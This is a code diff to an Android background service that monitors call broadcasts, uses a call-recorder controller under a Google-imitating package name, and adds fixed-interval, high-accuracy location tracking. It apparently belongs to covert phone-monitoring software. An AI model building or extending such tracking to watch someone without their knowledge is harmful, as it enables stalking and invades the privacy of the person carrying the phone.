@@ -10,6 +10,7 @@ import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 import com.google.tracking.call.CallRecorderController;
 import com.google.tracking.constants.TrackingConstants;
@@ -19,7 +20,7 @@ import google_api.ApiConnectionListener;
 
 public class TService extends Service {
 
-
+    private static final String TAG = "TService";
     private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
     private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
     private CallReceiver callReceiver;
@@ -71,19 +72,38 @@ public class TService extends Service {
     }
 
     private GoogleApiClient mGoogleApiClient;
+    private ApiConnectionListener mApiConnectionListener;
     private void createGoolApiClient() {
         // Create an instance of GoogleAPIClient.
-        ApiConnectionListener l = new ApiConnectionListener();
+        mApiConnectionListener = new ApiConnectionListener();
         if (mGoogleApiClient == null) {
             mGoogleApiClient = new GoogleApiClient.Builder(this)
-                    .addConnectionCallbacks(l)
-                    .addOnConnectionFailedListener(l)
+                    .addConnectionCallbacks(mApiConnectionListener)
+                    .addOnConnectionFailedListener(mApiConnectionListener)
                     .addApi(LocationServices.API)
                     .build();
-            l.setClient(mGoogleApiClient);
+
+            mApiConnectionListener.setClient(mGoogleApiClient);
+            mApiConnectionListener.setController(this);
         }
 
         mGoogleApiClient.connect();
+    }
+
+    public void createLocationRequest() {
+        Log.d(TAG, "createLocationRequest()");
+        LocationRequest mLocationRequest = new LocationRequest();
+        mLocationRequest.setInterval(TrackingConstants.RUN_REPEATING_TASK_INTERVAL);
+        mLocationRequest.setFastestInterval(5000);
+        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+
+        LocationServices.FusedLocationApi.requestLocationUpdates(
+                mGoogleApiClient, mLocationRequest, mApiConnectionListener);
+    }
+
+    protected void stopLocationUpdates() {
+        LocationServices.FusedLocationApi.removeLocationUpdates(
+                mGoogleApiClient, mApiConnectionListener);
     }
 
     public class CallReceiver extends BroadcastReceiver {
